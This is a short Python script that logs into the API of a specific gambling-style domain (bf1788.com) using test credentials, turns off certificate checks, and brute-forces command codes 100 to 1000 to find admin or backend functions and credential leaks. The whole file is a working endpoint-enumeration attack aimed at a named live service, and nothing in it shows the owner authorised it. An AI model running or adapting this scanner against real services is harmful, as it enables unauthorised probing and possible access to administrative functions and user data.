#!/usr/bin/env python3
"""Check for admin/backend endpoints and credential leaks on bf1788.com."""
import requests, urllib3, json, sys
urllib3.disable_warnings()

url = "https://apib63.bf1788.com/boxApi.php"
base = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

# Login first to get sid
resp = requests.post(url, data={"cmd": "1000", "wechatId": "testwechat001", **base}, timeout=10, verify=False)
try:
    data = resp.json()
    sid = data["msg"]["sid"]
    print(f"Logged in: sid={sid[:16]}..., username={data['msg']['username']}")
except:
    print(f"Login failed: {resp.text}")
    sys.exit(1)

print("\n=== Admin/Backend cmd scan (100-1000) ===")
admin_cmds_found = []
for cmd in range(100, 1001):
    params = {"cmd": str(cmd), "sid": sid, **base}
    try:
        r = requests.post(url, data=params, timeout=3, verify=False)
        if '"status":0' in r.text or '"code":0' in r.text:
            # Check if it returns admin-like data
            try:
                j = r.json()
                msg = j.get("msg", "")
                if isinstance(msg, dict):
                    keys = list(msg.keys())
                elif isinstance(msg, list):
                    keys = f"list[{len(msg)}]"
                else:
                    keys = str(msg)[:80]
                print(f"  cmd={cmd}: status=0, keys={keys}")
                admin_cmds_found.append(cmd)
            except:
                pass
    except:
        pass

print(f"\nTotal cmds with status=0: {len(admin_cmds_found)}")
print(f"Cmds: {admin_cmds_found}")